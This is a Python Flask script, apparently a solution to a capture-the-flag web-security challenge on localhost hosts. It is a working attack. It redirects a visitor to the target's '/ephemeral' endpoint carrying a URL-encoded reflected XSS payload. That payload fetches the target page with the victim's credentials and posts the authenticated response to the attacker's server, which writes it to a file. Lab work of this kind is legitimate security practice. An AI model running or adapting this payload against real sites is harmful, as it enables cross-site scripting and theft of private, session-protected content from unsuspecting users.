import flask

HOST = 'hacker.localhost'
PORT = 1337
TARGET = 'http://challenge.localhost'
SAVE_FILE = '/home/hacker/csrf_5_page.html'

app = flask.Flask(__name__)

@app.route('/admin', methods=['POST'])
def render_admin_home_page():
  html_content = flask.request.data.decode('utf-8')
  with open(SAVE_FILE, 'w') as file:
    file.write(html_content)

  return flask.make_response(f'Page has been write to {SAVE_FILE}')

@app.route('/')
def spawn():
  payload = (
    "<script>"
    f"fetch('{TARGET}', {{ method: 'GET', credentials: 'include' }})"
    ".then(res => res.blob())"
    ".then(blob => {"
    f"    fetch('http://{HOST}:{PORT}/admin', {{"
    "        method: 'POST',"
    "        mode: 'no-cors',"
    "        headers: { 'Content-Type': 'text/html' },"
    "        body: blob"
    "    }});"
    "})"
    ".catch(err => console.log(err));"
    "</script>"
  )
  encoded_payload = payload.replace("<", "%3C").replace(">", "%3E").replace(" ", "%20").replace("'", "%27")
  return flask.redirect(f'{TARGET}/ephemeral?msg={encoded_payload}')

app.config['SERVER_NAME'] = 'hacker.localhost:1337'
app.run(HOST, PORT)